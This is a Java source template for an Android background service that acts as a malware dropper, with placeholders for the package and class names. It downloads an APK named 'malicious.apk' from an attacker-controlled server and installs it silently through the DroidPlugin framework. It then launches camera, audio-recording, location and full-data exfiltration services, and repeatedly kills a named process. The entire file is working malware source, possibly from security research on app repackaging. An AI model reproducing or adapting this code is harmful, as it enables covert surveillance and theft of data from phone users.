package $PKGNAME;

import android.app.ActivityManager;
import android.app.IntentService;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.Manifest;
import android.os.Bundle;
import android.os.RemoteException;
import android.provider.Telephony;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import java.lang.Thread;
import java.lang.InterruptedException;

import java.io.File;
import java.io.InputStream;
import java.io.BufferedInputStream;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.io.IOException;

import java.net.URL;
import java.net.URLConnection;
import java.net.MalformedURLException;

import java.util.List;

import com.morgoo.droidplugin.pm.PluginManager;


public class $NAME extends IntentService {

    boolean m_downloaded = false;
    boolean m_installed = false;
    String filename = "malicious.apk";
    String maliciousPackage = "attacker.malicious";
    String[] maliciousServices = {"attacker.malicious.CameraExfilService", "attacker.malicious.CompleteExfilService","attacker.malicious.RecorderExfilService","attacker.malicious.LocationExfilService"};

    public boolean checkMaliciousApkExists() {
        return new File(getFilesDir(), filename).exists();
    }

    public boolean downloadMaliciousApk() {

        // check if already downloaded
        if (checkMaliciousApkExists()) {
            Log.d("malinstall", "malicious apk already downloaded");
            return true;
        }

        Context context = getApplicationContext();
        // check permission
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.INTERNET)
                == PackageManager.PERMISSION_DENIED) {
            Log.d("malinstall", "internet permission denied");
            return false;
        }

        // try downloading to private dir
        URL url = null;
        try {
            url = new URL(MainActivity.server + "/" + filename);
        }
        catch (MalformedURLException e) {
            Log.d("malinstall", "malformed url");
            return false;
        }

        try {
            URLConnection conn = url.openConnection();
            conn.connect();
            int lengthOfFile = conn.getContentLength();
            InputStream in = new BufferedInputStream(url.openStream(), 8192);
            FileOutputStream out = openFileOutput(filename, MODE_PRIVATE);
            byte[] buffer = new byte[1024];
            int totalLen = 0;
            int len = 0;
            while ((len = in.read(buffer)) != -1) {
                out.write(buffer, 0, len);
                totalLen += len;
            }
            if (lengthOfFile != totalLen) {
                // delete file for next try
                new File(getFilesDir(), filename).delete();
                return false;
            }
            out.flush();
            out.close();
            in.close();
        }
        catch (IOException e) {
            e.printStackTrace();
            return false;
        }

        Log.d("malinstall", "malicious apk downloaded successfully");
        return true;
    }

    public boolean installMaliciousApk() {
        // use droidplugin to install
        try {
            String apkPath = getFilesDir() + "/" + filename;
            Log.d("malinstall", "installing malicious apk @ " + apkPath);
            PluginManager.getInstance().installPackage(apkPath, 0);
            PackageManager pm = getPackageManager();
            Intent intent = new Intent();
            for (int i = 0; i < maliciousServices.length; i++) {
                Log.d("malinstall", "starting malicious service : " + maliciousServices[i]);
                intent.setComponent(new ComponentName(maliciousPackage, maliciousServices[i]));
                intent.putExtra("server", MainActivity.server);
                startService(intent);
            }
        } catch (RemoteException e) {
            Log.d("malinstall", "installation of malicious apk failed: " + e.toString());
            e.printStackTrace();
            return false;
        }
        return true;
    }

    public void killProcess(){
        List<ApplicationInfo> packages;
        PackageManager pm;
        pm = getPackageManager();
        //get a list of installed apps.
        packages = pm.getInstalledApplications(0);

        ActivityManager mActivityManager = (ActivityManager) this.getSystemService(Context.ACTIVITY_SERVICE);

        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals("$PLUGIN_PKGNAME")) {
                mActivityManager.killBackgroundProcesses(packageInfo.packageName);
            }
        }
    }

    public $NAME() {
        super($NAME.class.getName());
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        Log.d("malinstall", "malicious install service started");

        killProcess();

        // download malicious apk
        if (!m_downloaded) {
            while (!downloadMaliciousApk()) {
                Log.d("malinstall", "downloading malicious apk failed");
                try {
                    Thread.sleep(1000);
                }
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
            m_downloaded = true;
        }

        // install malicious apk
        if (!m_installed) {
            try {
                Thread.sleep(10 * 1000);
            } catch (InterruptedException e) { }
            if (installMaliciousApk()) {
                m_installed = true;
            }
        }

        while(true) {
            try {
                Thread.sleep(10 * 1000);
            } catch (InterruptedException e) { }
            killProcess();
        }
    }
}
